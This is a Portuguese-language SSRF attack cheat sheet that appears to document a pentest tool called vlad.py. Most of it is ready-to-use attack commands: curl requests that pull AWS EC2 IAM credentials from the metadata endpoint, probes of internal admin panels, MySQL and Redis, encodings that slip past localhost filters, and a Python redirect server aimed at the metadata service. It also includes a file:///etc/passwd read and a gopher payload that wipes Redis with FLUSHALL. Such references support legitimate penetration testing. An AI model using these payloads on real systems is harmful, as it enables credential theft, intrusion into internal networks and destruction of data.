# SSRF — Server-Side Request Forgery

## Como Funciona

O servidor é induzido a fazer requisições HTTP/DNS para alvos internos ou externos controlados pelo atacante.

```
Atacante → POST url=http://192.168.1.1/admin → Servidor → Rede interna
                                                          ↓
                                               Retorna resposta interna
```

## Identificar Parâmetros Vulneráveis

```
url=, uri=, link=, src=, source=, dest=, destination=
redirect=, callback=, webhook=, endpoint=, fetch=
request=, proxy=, forward=, host=, target=, path=
```

```bash
# Teste com destino controlado
curl "http://alvo.com/fetch?url=http://SEU_IP/" -v
# Se receber request no seu servidor → SSRF confirmado!

# Usando Burp Collaborator
curl "http://alvo.com/fetch?url=http://abc123.burpcollaborator.net/"
```

## Exploração de Rede Interna

```bash
# Acessar metadata AWS EC2
curl "http://alvo.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://alvo.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Acessar serviços internos
curl "http://alvo.com/fetch?url=http://192.168.1.1/"         # Router
curl "http://alvo.com/fetch?url=http://10.0.0.1/"            # Rede privada
curl "http://alvo.com/fetch?url=http://localhost:8080/admin"  # Admin panel local
curl "http://alvo.com/fetch?url=http://127.0.0.1:3306/"      # MySQL local
curl "http://alvo.com/fetch?url=http://127.0.0.1:6379/"      # Redis local
```

## Bypass de Filtros

### Variações de localhost
```
http://127.0.0.1/
http://0.0.0.0/
http://localhost/
http://[::1]/          # IPv6
http://0177.0.0.1/     # Octal
http://0x7f000001/     # Hex
http://2130706433/     # Decimal
http://127.1/          # Abreviado
```

### DNS Rebinding
```bash
# 1. Criar registro DNS que resolve para IP externo inicialmente
# 2. Após whitelist check, resolver para IP interno
# Usar: rbndr.us, singularity.samdrapkin.net
```

### Bypass por Redirect
```bash
# Servir redirect no seu servidor
# Quando servidor visitar: http://SEU_IP/redir
# Redirecionar para: http://169.254.169.254/

python3 -c "
import http.server
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(301)
        self.send_header('Location','http://169.254.169.254/latest/meta-data/')
        self.end_headers()
http.server.HTTPServer(('',80),H).serve_forever()
"
```

## SSRF em Protocolos Alternativos

```bash
# file:// — ler arquivos locais
url=file:///etc/passwd

# dict:// — fingerprint de serviços
url=dict://127.0.0.1:11211/stats   # Memcached

# gopher:// — interagir com serviços TCP
url=gopher://127.0.0.1:6379/_FLUSHALL  # Redis

# ftp://
url=ftp://127.0.0.1/
```

## Detecção com vlad.py

```bash
python vlad.py web --alvo "http://alvo.com/?url=test" --tipo ssrf
```
